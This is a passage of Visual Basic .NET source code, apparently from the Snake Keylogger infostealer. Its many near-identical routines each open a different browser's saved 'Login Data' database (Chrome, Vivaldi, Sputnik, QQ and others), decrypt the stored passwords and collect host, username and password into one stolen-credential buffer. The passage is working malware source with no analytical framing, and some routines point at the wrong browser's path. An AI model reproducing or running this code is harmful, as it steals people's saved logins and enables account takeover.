                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Kinza" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTSputnik()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Sputnik\Sputnik\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Sputnik" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTFalkon()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Sputnik\Sputnik\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Falkon" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub
    Public Sub COVIDSTSalamWeb()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\SalamWeb\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: SalamWeb" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTCoolNovo()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\MapleStudio\ChromePlus\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: CoolNovo" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTQIPSurf()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\QIP Surf\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: QIP Surf" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTBlackHawk()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\BlackHawk\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Black Hawk" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDST7Star()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\7Star\7Star\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: 7Star" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTSleipnir()

        Dim datapath As String = Environ("APPDATA") + "\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Sleipnir" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTCitrio()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\CatalinaGroup\Citrio\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Citrio" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTChrome_Canary()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome SxS\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Chrome Canary" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub
    Public Sub COVIDSTChrome()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Google Chrome" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub
    Public Sub COVIDSTCoowon()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Coowon\Coowon\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Coowon" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub
    Public Sub COVIDSTCocCoc()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\CocCoc\Browser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: CocCoc" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTUran()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\uCozMedia\Uran\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If
                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Uran" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTQQ()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Tencent\QQBrowser\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: QQ" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTorbitum()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Orbitum\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Orbitum" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine + "---------------------------------" + vbNewLine + " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTSlimjet()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Slimjet\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Slimjet" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTIridium()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Iridium\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Iridium" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTVivaldi()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Vivaldi\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Vivaldi" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTIron()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Chromium\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


                    Else
                        pass55 = Decrypttttt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    End If

                    If (userrrrr <> "") And (pass55 <> "") Then
                        Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Iron" & vbNewLine & "Host: " & hostss & vbNewLine & "USR: " & userrrrr & vbNewLine & "PSWD: " & pass55 & vbNewLine & "---------------------------------" _
                        & vbNewLine & " ")
                        COVID19.StoragePW += cPass

                    End If
                Next

            End If
        Catch e As Exception

        End Try
    End Sub

    Public Sub COVIDSTChromium()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Chromium\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)
